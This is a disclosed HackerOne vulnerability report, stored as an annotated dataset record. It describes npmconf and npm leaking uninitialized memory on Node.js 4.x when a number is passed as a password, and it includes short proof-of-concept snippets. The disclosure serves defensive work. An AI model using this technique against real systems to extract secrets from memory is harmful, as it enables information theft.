{
  "reported_to": "Node.js third-party modules",
  "reported_by": "chalker ",
  "title": "`npmconf` (and `npm` js api) allocate and write to disk uninitialized memory content when a typed number is passed as input on Node.js 4.x",
  "content": "\nI would like to report a Buffer allocation issue in npmconf (and npm package js api).\nIt allows to extract sensitive content from uninitialized memory by passing typed input to setCredentialsByURI, limited to Node.js 4.x and below.\nModule\nmodule name: npmconf\nversion: 2.1.2\nnpm page: https://www.npmjs.com/package/npmconf\nmodule name: npm\nversion: 5.6.0\nnpm page: https://www.npmjs.com/package/npm\nModule Description\nThe config thing npm uses\nModule Stats\nnpmconf\n40 292 downloads in the last day\n219 837 downloads in the last week\n897 947 downloads in the last month\n~1 0775 364 estimated downloads per year\nnpmconf is deprecated, but doesn't mention security issues and is still widely used, and the usage seems to increase over time.\nnpm\nnpm download stats are not representive here, as it's mainly used as a CLI, not as JS api, but here they are (e.g. for comparison with npmconf):\n141 545 downloads in the last day\n1 067 194 downloads in the last week\n3 701 192 downloads in the last month\n~44 414 304 estimated downloads per year\nVulnerability\nVulnerability Description\nWhen a number is passed to the password property of config.setCredentialsByURI, npmconf/npm allocate uninitialized Buffer instances during conversion to base64 (on Node.js 4.x) due to missing type checks before passing user input to the new Buffer() constructor.\nThose Buffer instances could (and most likely will) contain sensitive information, see Buffer-knows-everything.md.\nNode.js 4.x is stated as supported in npm.\nSteps To Reproduce:\nUse Node.js 4.x LTS or below.\nnpmconf\nCode 374 Bytes\n1var URI = \"https://registry.example.com:8661/\";\n2require('npmconf').load({}, function (err, conf) {\n3  conf.setCredentialsByURI(URI, {username: 'foo', email: 'boo@example.com', password: 200});\n4  console.log(conf.getCredentialsByURI(URI)); // This just outputs the setting\n5  // conf.save('user', function() {}) // Warning: writes base64-encoded uninitialized buffer .npmrc\n6});\nnpm\nCode 387 Bytes\n1var URI = \"https://registry.example.com:8661/\";\n2require('npm').load({}, function (err, npm) {\n3  npm.config.setCredentialsByURI(URI, {username: 'foo', email: 'boo@example.com', password: 200});\n4  console.log(npm.config.getCredentialsByURI(URI)); // This just outputs the setting\n5  // npm.config.save('user', function() {}) // Warning: writes base64-encoded uninitialized buffer .npmrc\n6});\nSupporting Material/References:\nArch Linux\nNode.js v4.8.7 (latest in 4.x LTS branch)\nnpm 5.6.0\nWrap up\nI contacted the maintainer to let him know: Y\nI opened an issue in the related repository: N\nI reported this initially on 2016-01-20 over email, but didn't receive any response.\nProbably was deemed insignificant or out-of-scope, but I still think this should be fixed and disclosed.\nImpact\nRead uninitialized memory, extracting sensitive information from it.\nCause a DoS by large Buffer allocation and conversion to string.\n\n",
  "severity": [
    7.4,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "Out-of-bounds Read"
  ],
  "screenshots": {},
  "disclosed_date": 1526129760,
  "report_url": "https://hackerone.com/reports/320269",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "MEDIUM",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Use Node.js 4.x LTS or below."
    ],
    [
      2,
      "Pass a number as the password property to config.setCredentialsByURI in npmconf or npm."
    ],
    [
      3,
      "Observe that the Buffer instance contains uninitialized memory content."
    ],
    [
      4,
      "Optionally save the configuration to disk, writing the uninitialized memory content to .npmrc."
    ]
  ],
  "vuln_description": "When a number is passed to the password property of config.setCredentialsByURI, npmconf/npm allocate uninitialized Buffer instances during conversion to base64 (on Node.js 4.x) due to missing type checks before passing user input to the new Buffer() constructor. This can lead to sensitive information disclosure from uninitialized memory.",
  "reason": "The vulnerability requires understanding of Node.js 4.x Buffer behavior and the specific API usage in npmconf/npm, but the attack itself is straightforward once these components are known. The interaction between the number input and Buffer allocation is subtle but not highly complex.",
  "new_complexity": "MEDIUM",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null
}